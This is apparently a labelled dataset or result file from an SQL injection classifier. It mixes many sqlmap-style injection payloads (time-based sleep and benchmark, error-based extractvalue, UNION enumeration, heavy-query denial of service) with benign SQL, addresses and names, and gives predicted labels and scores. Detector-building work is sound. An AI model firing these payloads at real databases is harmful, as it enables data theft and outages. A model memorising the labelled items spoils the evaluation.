payload,label,hardened_pred_label,hardened_pred_score
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,1,0.9999933
43823011f,0,0,7.64056e-06
1' rlike sleep  (  5  ) ,1,1,0.9999932
cella,0,0,8.1060425e-06
1'  )   as chla where 6098  =  6098,1,1,0.9999933
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0,8.013523e-06
1%'  )   and 4595  =  4595#,1,1,0.9999933
"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,0.9999932
corazones 168,0,0,7.667612e-06
grifeo@lalectura.af,0,0,7.443076e-06
52207398c,0,0,7.649426e-06
" SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION ",0,0,7.6051565e-06
"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1,1,0.9999932
"-5360' where 8178  =  8178 union all select 8178,8178,8178--",1,1,0.9999932
SELECT throw ( s FROM son RIGHT JOIN,0,0,7.630111e-06
SELECT * FROM family WHERE progress NOT LIKE 'try%',0,0,7.8462535e-06
c/ san ildefonso 106 10?h,0,0,7.424523e-06
"plaza aparejador federico bermudez 139,",0,0,7.4513778e-06
"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.9999932
48di48l92,0,0,7.5650755e-06
SELECT * FROM gulf WHERE stream IN  ( SELECT flame FROM got ) ,0,0,7.480841e-06
SELECT * FROM soon WHERE frozen NOT BETWEEN 'remember' AND 'has',0,0,7.651046e-06
"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",1,1,0.9999933
bernette2,0,0,7.821503e-06
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1,1,0.9999931
SELECT * FROM hay FETCH FIRST 3 ROWS ONLY,0,0,7.5085877e-06
"SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE VIEW [Brazil Customers] AS ",0,0,7.5839503e-06
"  SELECT suitID AS ID, nervous AS store FROM crop",0,0,7.800691e-06
romeralo pers,0,0,7.6705155e-06
"  SELECT flew,instead,vapor FROM independent LEFT JOIN Orders ON earn.thoughID =  plate.built ORDER BY rocky.surface",0,0,7.3861183e-06
" SELECT * FROM broad ORDER BY took ASC, happened DESC",0,0,7.889233e-06
"  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,0.9999932
nao,0,0,8.146216e-06
diy$ambo,0,0,7.660705e-06
3o7za732,0,0,7.5453763e-06
SELECT * FROM but,0,0,7.959074e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3946 )  ORDER BY meta_id ASC",0,0,7.513172e-06
928,0,0,8.05913e-06
bollullos de la mitacin,0,0,7.457371e-06
"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0.9999932
SELECT AVG ( provide ) FROM opposite,0,0,7.973965e-06
SELECT * FROM scientific,0,0,8.174059e-06
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,1,0.9999932
"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1,1,0.9999932
av. vigo 144 2?h,0,0,7.454505e-06
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,1,0.9999932
darns cabrianes,0,0,7.5279468e-06
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,1,0.9999932
1  )   as sglv where 7676  =  7676,1,1,0.9999933
FROM  ( SELECT DISTINCT airplane FROM flow ) ,0,0,7.69939e-06
SELECT * FROM fix WHERE powder BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.673252e-06
"  SELECT Orders.fallenrID, Employees.ranch, Employees.worry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.heldID ORDER BY Orders.biteID",0,0,7.3257056e-06
"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#",1,1,0.9999933
crabe,0,0,8.0698355e-06
"-4373%""   )    )    or 5672  =  5188--",1,1,0.9999932
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,0,0,7.720324e-06
SELECT pie ( s )  FROM constantly,0,0,7.6663255e-06
"   SELECT careful, aware, reasonFROM plane WHERE flag  IS NOT NULL",0,0,7.7490995e-06
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1,1,0.9999932
"1""   )    )    rlike sleep  (  5  )  #",1,1,0.9999932
"-7433""   )    )    as zsnt where 2513  =  2513 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,1,0.9999932
SELECT * FROM will  WHERE safety = floating,0,0,8.011498e-06
SELECT see ( s )  FROM breathing LEFT JOIN,0,0,7.5460384e-06
"-9008'  )   union all select 4976,4976,4976,4976#",1,1,0.9999933
1' and 5835  =  6157 and 'bjee' like 'bjee,1,1,0.9999932
1'  )   where 3588  =  3588,1,1,0.9999932
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1,1,0.9999932
mari cielo,0,0,7.60829e-06
"1 where 9898  =  9898 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,0.9999931
pettingill@demasiado.com.bv,0,0,7.440734e-06
SELECT * FROM thus 3,0,0,7.942801e-06
nada,0,0,8.1595035e-06
yu-chian,0,0,7.643154e-06
SELECT * FROM came FETCH FIRST 3 ROWS ONLY,0,0,7.5490975e-06
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,0.9999932
SELECT golden ( s )  FROM citizen UNION,0,0,7.4040463e-06
SELECT * FROM pair WHERE your = 'corn' FETCH FIRST 3 ROWS ONLY,0,0,7.654914e-06
"1""  )   order by 1--",1,1,0.9999932
4.86728E+15,0,0,7.6082324e-06
34578974s,0,0,7.655585e-06
"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1,1,0.9999932
-7387'   )    )     )   order by 1--,1,1,0.9999932
"iif  (  9190  =  5059,1,1/0  )  ",1,1,0.9999932
"  SELECT scientist,film,experiment FROM bone LEFT JOIN Orders ON stretch.mailID =  least.brass ORDER BY shoot.hurried",0,0,7.845701e-06
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1,1,0.9999932
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",1,1,0.9999932
SELECT * FROM machinery WHERE choice = 'plan',0,0,7.820331e-06
c/ juan perez arriete 19 13e,0,0,7.4318054e-06
"  SELECT recently,setting FROM century WHERE be = 'solve' UNION SELECT avoid, addition FROM front",0,0,7.4140653e-06
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",1,1,0.9999933
SELECT graph ( s )  FROM many SELECT properly ( s ) ,0,0,7.656535e-06
acrianzada,0,0,7.709405e-06
78370849m,0,0,7.588146e-06
"   SELECT dirt, three, love FROM blood WHERE spirit  IS NULL",0,0,7.514548e-06
SELECT * FROM function  WHERE object = end,0,0,7.724801e-06
SELECT * FROM bottle WHERE next BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.4900427e-06
"granados 151,",0,0,7.66672e-06
1'   )    )    as vdhw where 8858  =  8858 order by 1#,1,1,0.9999933
1'||  (  select 'czos' from dual where 6814  =  6814,1,1,0.9999933
a' --,1,1,0.9999919
SELECT TOP 3 * FROM direction SELECT * FROM theory 3SELECT * FROM tail,0,0,7.861661e-06
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",1,1,0.9999931
SELECT TOP 3 * FROM opposite WHERE place = 'beside',0,0,7.632112e-06
"   SELECT pick, current+ ', ' + compare+ ' ' + screen+ ', ' + smallest AS pride  FROM child",0,0,7.459206e-06
"campello, el",0,0,7.586091e-06
trampeador,0,0,7.7233135e-06
SELECT AVG ( either ) FROM result SELECT SUM ( slipped ) ,0,0,7.61054e-06
SELECT * FROM day WHERE    NOT practice = 'depth',0,0,7.990773e-06
"1""   )    )    as rpxd where 4929  =  4929",1,1,0.9999933
31560,0,0,8.110342e-06
"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",1,1,0.9999932
SELECT SYSDATE (  )  + 1;,0,0,7.55156e-06
SELECT * FROM glass WHERE slightly NOT LIKE '[cause]%',0,0,7.774378e-06
1  )   as jtfx where 8038  =  8038,1,1,0.9999933
SELECT COUNT ( six )  FROM here,0,0,7.636969e-06
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",1,1,0.9999932
 or sleep  (  __TIME__  )  #,1,1,0.9999932
van_bake,0,0,7.657184e-06
alma,0,0,8.115742e-06
SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,0,0,7.4805625e-06
9640,0,0,8.094686e-06
SELECT * FROM breakfast WHERE simplest BETWEEN taste09/01/1996plastic AND event15/31/1996because,0,0,7.450213e-06
-8760  )   where 8277  =  8277 union all select 8277--,1,1,0.9999932
"   SELECT chapter,die,seat,can,proper     (  (  gun JOIN night ON higher.needle =  wall.yourself )   INNER JOIN freeON Orders.community =  rear.driverID ) ",0,0,7.769397e-06
"  SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",0,0,7.3902615e-06
1' where 4945  =  4945,1,1,0.99999285
SELECT MIN ( somewhere )  AS individual FROM held,0,0,7.692954e-06
"  SELECT ifID AS ID, friendly AS care FROM card",0,0,7.718586e-06
SELECT * FROM nobody WHERE idea = 'chamber'  OR noun = 'four',0,0,7.630526e-06
SELECT * FROM bone WHERE blue = 'situation' FETCH FIRST 3 ROWS ONLY,0,0,7.44407e-06
8.55461E+15,0,0,7.424254e-06
"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.9999932
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""ajuh""  =  ""ajuh",1,1,0.9999932
22587,0,0,8.114991e-06
1%' rlike sleep  (  5  )   and '%'  =  ',1,1,0.9999933
emetrio,0,0,8.130058e-06
oblong0,0,0,7.837698e-06
SELECT * FROM deep WHERE NOT sky = 'tent'  AND NOT who = 'crew',0,0,7.7347095e-06
8282,0,0,8.058261e-06
"1 and make_set  (  8403  =  8403,8899  )  ",1,1,0.9999932
SELECT RADIANS ( -45 ) ;,0,0,7.5075136e-06
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,0.9999932
duran manero,0,0,7.70881e-06
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,1,1,0.9999932
pg_sleep  (  __TIME__  )  --,1,1,0.99999297
SELECT * FROM brother WHERE occasionally = 'visitor' LIMIT 3,0,0,7.6051856e-06
SELECT TOP 3 * FROM gain,0,0,8.272739e-06
" SELECT column_name ( s )  FROM zipper,hot",0,0,7.4259674e-06
"  SELECT root AS hunt, long AS [birth]  FROM attention",0,0,7.7062e-06
newlinsky@forohh.et,0,0,7.4413797e-06
SELECT * FROM telephone,0,0,7.977692e-06
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0.9999932
SELECT * FROM orbit WHERE card = 'children'  OR regular = 'path',0,0,7.671174e-06
alfardilla,0,0,7.837354e-06
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",1,1,0.9999932
SELECT COUNT ( imagine ) FROM begun,0,0,7.818646e-06
"  UPDATE bare SET bigger =  'six', City =  'plus' WHERE common =  wind",0,0,7.4498867e-06
"calle doctor bove, 65",0,0,7.478501e-06
SELECT AVG ( perfectly ) FROM band,0,0,7.854549e-06
tice,0,0,8.033784e-06
karkotsk,0,0,7.66061e-06
SELECT * FROM simple WHERE good NOT BETWEEN 'attempt' AND 'stems',0,0,7.894155e-06
SELECT AVG ( vowel ) FROM trade SELECT SUM ( plates ) ,0,0,7.519903e-06
"paseo los gofiones, 62,",0,0,7.424424e-06
algemes,0,0,7.820063e-06
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",1,1,0.9999932
1  )   where 1622  =  1622,1,1,0.9999933
2.14581E+15,0,0,7.443715e-06
6478,0,0,7.954133e-06
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0,0,7.5143757e-06
SELECT * FROM mental FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM course,0,0,7.630933e-06
SELECT * FROM local WHERE    NOT winter = 'region',0,0,7.631545e-06
"-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,0.9999932
decacque,0,0,7.835381e-06
SELECT COUNT ( lot ) FROM people,0,0,7.942134e-06
"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",1,1,0.9999932
SELECT * FROM verb WHERE attention = 'train',0,0,7.963607e-06
SELECT TOP 3 * FROM equipment WHERE stream = 'guide' SELECT * FROM particular,0,0,7.871129e-06
general ricardos 187,0,0,7.508072e-06
declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1,1,0.9999932
"-3731'   )    )     )   or elt  (  7540  =  1412,1412  )   and    (    (     (  'iwch'  =  'iwch",1,1,0.9999932
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,1,1,0.9999933
SELECT AVG ( breath ) FROM protection,0,0,7.911822e-06
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn",1,1,0.9999932
SELECT COUNT ( examine ) FROM congress,0,0,7.943801e-06
" SELECT column_name ( s )  FROM plain,amount",0,0,7.4044133e-06
SELECT COUNT ( birds ) FROM wish,0,0,7.997773e-06
mallejac,0,0,7.805579e-06
matacandelas,0,0,7.683027e-06
1' where 9544  =  9544,1,1,0.9999927
"1""  )   union all select null,null,null,null,null,null,null#",1,1,0.9999933
"  SELECT Orders.parallelrID, Employees.was, Employees.volume FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.toID ORDER BY Orders.burstID",0,0,7.3113833e-06
"1"" where 9342  =  9342 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,1,0.9999932
hi' or 'a'  =  'a,1,1,0.9999932
93310194e,0,0,7.583299e-06
-3243 or 2266  =  3583#,1,1,0.9999931
kiyohara,0,0,7.684824e-06
-8099%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1,1,0.9999932
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",1,1,0.9999932
guilas,0,0,7.838596e-06
53424203x,0,0,7.5533753e-06
1  )   and 4595  =  4595#,1,1,0.9999933
pierre,0,0,8.1209755e-06
SELECT * FROM typical,0,0,8.3253235e-06
"  SELECT garage,worse,it FROM breath LEFT JOIN Orders ON needs.lotID =  wagon.characteristic ORDER BY mouse.spent",0,0,7.6201122e-06
"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1,1,0.9999933
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1,1,0.9999932
$despumar,0,0,7.6802735e-06
SELECT cut FROM surface,0,0,7.999168e-06
 (  case when 2646  =  8520 then 2646 else null end  ) ,1,1,0.9999933
1'   )    )     )   and sleep  (  5  )  #,1,1,0.9999932
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""cwat"" like ""cwat",1,1,0.9999932
"1%' union all select null,null,null,null,null,null,null,null,null,null#",1,1,0.9999933
villadoz,0,0,7.85341e-06
"SELECT * FROM low WHERE money BETWEEN ""effort"" AND    ""favorite""",0,0,7.900165e-06
08490721h,0,0,7.5688786e-06
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,0.9999932
"  SELECT taughtID AS ID, discovery AS steady FROM mainly",0,0,7.887036e-06
SELECT DISTINCT hollow FROM ordinary,0,0,7.995606e-06
SELECT * FROM husband,0,0,7.948636e-06
"1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,0.9999932
488u7ra,0,0,7.672997e-06
"  SELECT root,nice FROM fourth WHERE both = 'very' UNION SELECT habit, war FROM fast",0,0,7.4352292e-06
SELECT * FROM society WHERE    NOT entire = 'mouth',0,0,7.732622e-06
couri-manahan@copiar.com.fm,0,0,7.434393e-06
SELECT * FROM better WHERE gave = 'slipped',0,0,7.976231e-06
albuminmetro,0,0,7.687403e-06
"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",1,1,0.9999932
38182378d,0,0,7.533779e-06
oplinger,0,0,8.046973e-06
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,1,0.9999933
"1 where 3737  =  3737 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0.9999932
"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1,1,0.9999932
mccreano,0,0,7.662255e-06
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_file_sync_1_process_lock' LIMIT 1,0,0,7.619618e-06
puigpunyent,0,0,7.6139377e-06
"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",1,1,0.9999932
"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.9999932
"-4305   )    )     )   union all select 2401,2401--",1,1,0.9999932
brana,0,0,8.119574e-06
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c883f67716' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0,8.159706e-06
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'lshk' like 'lshk",1,1,0.9999932
SELECT body ( s )  FROM statement FULL OUTER JOIN,0,0,7.505545e-06
bocana$da,0,0,7.5908893e-06
1' where 3188  =  3188 and 9198  =  9198--,1,1,0.9999933
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",1,1,0.9999933
"1'   )    )    union all select null,null,null--",1,1,0.9999933
"-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre",1,1,0.9999932
"calle el pilar s/n,",0,0,7.440457e-06
SELECT * FROM refused WHERE whom = 'climb'  AND City = 'alive',0,0,7.6800825e-06
FROM  ( SELECT DISTINCT storm FROM south ) ,0,0,7.460593e-06
SELECT * FROM afraid WHERE rays = 'roar',0,0,7.800386e-06
1745,0,0,8.095289e-06
c/ guillen santacilla 94,0,0,7.428702e-06
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'zknl'  =  'zknl",1,1,0.9999931
"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.9999933
SELECT * FROM because WHERE happily = 'hunt' FETCH FIRST 3 ROWS ONLY,0,0,7.683057e-06
"SELECT CONCAT_WS ( ""-"", ""SQL"", ""Tutorial"", ""is"", ""fun!"" )  AS ConcatenatedString;",0,0,7.4083687e-06
18440,0,0,8.078275e-06
"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1,0.9999932
SELECT AVG ( no ) FROM cabin SELECT SUM ( felt ) ,0,0,7.5186554e-06
SELECT * FROM individual WHERE    NOT post = 'horn',0,0,8.01188e-06
os,1,0,8.639388e-06
" SELECT * FROM electricity ORDER BY hour ASC, nest DESC",0,0,7.816402e-06
" SELECT * FROM though ORDER BY good ASC, lips DESC",0,0,7.860889e-06
"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""xgka"" like ""xgka",1,1,0.9999932
"1""   )    )    and 4595  =  4595#",1,1,0.9999933
3600,0,0,8.0378695e-06
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_link' LIMIT 1,0,0,7.460999e-06
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,1,0.9999932
FROM  ( SELECT DISTINCT ancient FROM band ) ,0,0,7.7575505e-06
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,1,1,0.9999932
1'   )    )    order by 1--,1,1,0.9999933
73107657h,0,0,7.654987e-06
SELECT * FROM arrangement FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.742606e-06
"1%'   )    )    union all select null,null--",1,1,0.9999933
"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.9999932
"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",1,1,0.9999932
1'  )   as rbpx where 1264  =  1264,1,1,0.9999933
 (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,1,1,0.9999932
SELECT * FROM action WHERE catch = 'public',0,0,7.903481e-06
SELECT * FROM cap WHERE shape BETWEEN lie09/01/1996blanket AND farmer15/31/1996position,0,0,7.49611e-06
SELECT shine ( s FROM can RIGHT JOIN,0,0,7.688643e-06
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0.9999932
"-7236 or make_set  (  9618  =  6919,6919  )  ",1,1,0.9999933
mino@showcarsmadrid.com.zm,0,0,7.4371724e-06
SELECT nation ( s ) FROM spend INNER JOIN,0,0,7.765345e-06
"1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#",1,1,0.9999932
"  SELECT theory,minerals,attempt FROM leg LEFT JOIN Orders ON write.itselfID =  country.stone ORDER BY together.seeing",0,0,7.3918263e-06
"1%'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0.9999932
SELECT * FROM studied WHERE discuss = 'free' FETCH FIRST 3 ROWS ONLY,0,0,7.774845e-06
"  SELECT * FROM mail WHERE human NOT IN  ( 'particles', 'porch', 'colony' )  ",0,0,7.418917e-06
"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",1,1,0.9999933
"   SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL",0,0,7.641522e-06
peng1in,0,0,7.646501e-06
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1,1,0.9999932
-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,1,1,0.9999932
SELECT * FROM greatest WHERE tank = 'grow'  AND City = 'upper',0,0,7.816976e-06
-3105' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'srep'  =  'srep,1,1,0.9999931
74725623a,0,0,7.660786e-06
SELECT * FROM seldom WHERE NOT union = 'drove'  AND NOT window = 'liquid',0,0,7.5974435e-06
"-5078 union all select 9708,9708--",1,1,0.9999933
haslund@arvigar.sl,0,0,7.4483946e-06
DELETE FROM right WHERE gather = 'already',0,0,7.6468e-06
ru5runears2,0,0,7.541815e-06
